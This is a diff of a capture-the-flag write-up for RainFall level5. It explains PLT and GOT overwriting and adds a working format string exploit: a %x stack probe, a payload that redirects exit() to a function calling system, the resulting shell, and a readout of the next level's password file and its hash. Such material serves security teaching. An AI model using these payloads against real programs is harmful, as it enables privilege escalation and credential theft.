@@ -53,14 +53,16 @@ Dump of assembler code for function o:
 [...]
    0x080484b1 <+13>:	call   0x80483b0 <system@plt>
 ```
-Why are all these functions ```@plt```? <br/>
+Why are all these functions ```@plt```? <br/> <br/>
 ~ A little background: ~ <br/>
-A ```PLT``` (or Procedure Linkage Table) is a special section in compiled programs which consists of many jump instructions to external functions / shared libraries (for example, libc functions). These jump instructions jump to the ```GOT``` (or Global Offset Table), which contains the actual function address. <br/>
-The PLT is read-only but the GOT can be written to. <br/>
-The execution flow of the program can be controlled by overwriting one of the GOT's function addresses. <br/>
+A ```PLT``` (or Procedure Linkage Table) is a special section in compiled programs which consists of many jump instructions to external  <br/>
+functions / shared libraries (for example, libc functions). These jump instructions jump to the ```GOT``` (or Global Offset Table),  <br/>
+which contains the actual function address. <br/>
+The PLT is read-only, but the GOT can be written to. <br/>
+The execution flow of the program can be controlled by overwriting one of the GOT's function addresses. <br/> <br/>
 So... what's the plan? <br/>
-We can leverage ```printf``` in a format string attack to replace the address of ```exit()``` with the address of ```o()```, which will then call ```system``` to launch a new shell. <br/> <br/> 
-
+We can leverage ```printf``` in a format string attack to replace the address of ```exit()``` with the address of ```o()```, <br/>
+which will then call ```system``` to launch a new shell. <br/> <br/> 
 Let's locate the addresses of ```exit()``` and ```o()```. <br/> 
 ```
 (gdb) info functions
@@ -75,4 +77,37 @@ Unfortunately, the real address of ```exit()``` is in the GOT. Let's looks there
 level5@RainFall:~$ objdump -R level5 | grep exit
 08049838 R_386_JUMP_SLOT   exit
 ```
-So the address of ```exit()``` is 0x08049838, and the address of ```o()``` is 0x080484a4.
+So the address of ```exit()``` is 0x08049838, and the address of ```o()``` is 0x080484a4.<br/><br/>
+
+Just like in level3, let's check our buffer position with a ```printf()``` string format exploit.
+```
+level5@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x"' | ./level5
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+```
+We can see our buffer "AAAA" in the 4th position on the stack as 41414141. <br/>
+So let's replace "AAAA" with the address of ```exit()``` (in little endian). <br/><br/>
+The next step is to overwrite ```exit()``` by ```o()```, using the the ```%n``` modifier. <br/>
+For the ```%n``` modifier, we need the number of bytes to write. <br/>
+"0x080484a4" in decimal is "134513828" (minus the exit GOT address [4 bytes]). <br/><br/>
+Here is what our string attack will look like:
+```
+"exit GOT address" + "134513828 - 4 bytes" + "%4$n"
+python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' 
+```
+Let's try it out!
+```
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' ; cat -) | ./level5
+[You will find are in an infinite print loop. Type anything and press "enter"]
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+
+
+
+
+
+
+
